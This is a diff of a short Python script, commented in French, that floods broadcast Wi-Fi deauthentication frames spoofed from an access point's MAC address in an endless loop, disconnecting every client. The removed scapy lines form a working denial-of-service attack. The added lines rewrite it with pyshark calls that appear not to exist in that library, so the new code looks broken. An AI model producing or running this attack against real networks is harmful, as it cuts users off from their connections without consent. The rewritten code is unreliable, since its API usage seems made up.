@@ -1,13 +1,18 @@
-from scapy.all import *
+import pyshark
 
 def deauth_all(ap_mac, interface):
     # Créer un paquet de déauthentification
-    packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac, subtype=0x00)
-    packet /= Dot11Deauth(reason=7)  # 7 = code de raison pour un cadre de classe 3 reçu d'un STA non associé
+    packet = pyshark.Packet()
+    packet.layers.append(pyshark.Layer('Dot11'))
+    packet.layers.append(pyshark.Layer('Dot11Deauth'))
+    packet.layers[0].addr1 = 'ff:ff:ff:ff:ff:ff'
+    packet.layers[0].addr2 = ap_mac
+    packet.layers[0].addr3 = ap_mac
+    packet.layers[1].reason = 7
 
     # Envoyer le paquet en boucle
     while True:
-        sendp(packet, iface=interface, count=1, verbose=False)
+        packet.send(interface)
         print(f"Deauthenticating all devices from {ap_mac}")
 
 # Remplacez par l'adresse MAC du point d'accès et l'interface réseau
